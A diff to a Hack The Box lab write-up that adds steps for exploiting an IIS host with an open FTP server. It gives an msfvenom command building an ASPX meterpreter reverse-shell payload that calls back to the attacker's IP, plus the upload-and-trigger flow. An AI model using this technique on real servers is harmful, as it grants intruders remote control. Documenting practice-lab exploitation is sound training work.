@@ -54,3 +54,30 @@ Nmap done: 1 IP address (1 host up) scanned in 113.08 seconds
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/90f5c1ab-37e1-4bbe-8e45-be4c8db31907)
 
 
+5. Thing to note, since we're in a ftp server, we **need to check** if we can upload a file from our local machine to this ftp server.
+6. For example let's make our reverse shell payload using **msfvenom**.
+7. We want to save the payload in asp or aspx format file. Why?? Because IIS execute that file.
+
+> COMMAND 
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.20 lport=1337 -f aspx > reverse_shell.aspx
+```
+
+### FLOW
+
+```
+1. Create reverse shell payload using msfvenom.
+2. Set listener on the specfied port.
+3. run put file.aspx on the ftp server (to download the file from our local machine).
+4. Then trigger the reverse shell payload by accessing it --> http://ip/file.aspx.
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/715111d5-aa90-4e10-a0b3-f1bb3f093642)
+
+
+8. It's stuck there, confused why.
+9. Succeed got shell after used the msfconsole listener.
+
